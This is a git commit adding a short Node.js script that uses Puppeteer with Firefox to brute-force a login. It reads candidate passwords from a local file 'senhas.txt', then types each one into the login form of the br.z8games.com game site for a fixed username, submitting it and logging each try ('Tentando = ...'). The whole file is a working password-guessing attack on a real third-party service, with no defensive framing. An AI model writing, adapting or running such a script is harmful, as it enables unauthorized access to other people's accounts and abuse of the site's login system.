71c0198f6eb7f584e83a2819c90ac4b3f7401992
Bruno Eleodoro Roza <tesopehak@quick-mail.online>
2020-01-15 22:45:45 -0300

    Primeiro commit

---
+++ index.js
@@ -0,0 +1,53 @@
+const pptrFirefox = require('puppeteer-firefox');
+const fs = require('fs');
+
+function sleep(ms) {
+    return new Promise((r, r2) => {
+        setTimeout(() => {
+            r(true)
+        }, ms)
+    })
+}
+
+(async () => {
+    const browser = await pptrFirefox.launch({
+        headless: false,
+        ignoreHTTPSErrors: true,
+        defaultViewport: null,
+        args: [
+            '--disable-gpu',
+            '--disable-dev-shm-usage',
+            '--disable-setuid-sandbox',
+            '--no-first-run',
+            '--no-sandbox',
+            '--no-zygote',
+            '--single-process',
+            '--ignore-certificate-errors',
+            '--ignore-certificate-errors-spki-list',
+            '--enable-features=NetworkService',
+            `--window-size=${200},${200}`
+        ]
+    });
+
+    var lista = fs.readFileSync('./senhas.txt').toString().split('\n')
+
+    const page = await browser.newPage();
+    await page.goto('https://br.z8games.com/login.html');
+    await page.waitForSelector('input[id="login-page-userid"]');
+    await page.type('input[id="login-page-userid"]', 'USUARIO');
+    var i = 0;
+    while (i < lista.length) {
+        // await page.evaluate((evalVar) => {
+        //     alert('Tentando = ' + evalVar)
+        // }, lista[i])
+        await page.type('input[id="login-page-password"]', lista[i]);
+        await page.click('button[type="submit"]');
+        console.log('Tentando = ' + lista[i])
+        await sleep(5000)
+
+        i++;
+    }
+
+
+    await browser.close();
+})();
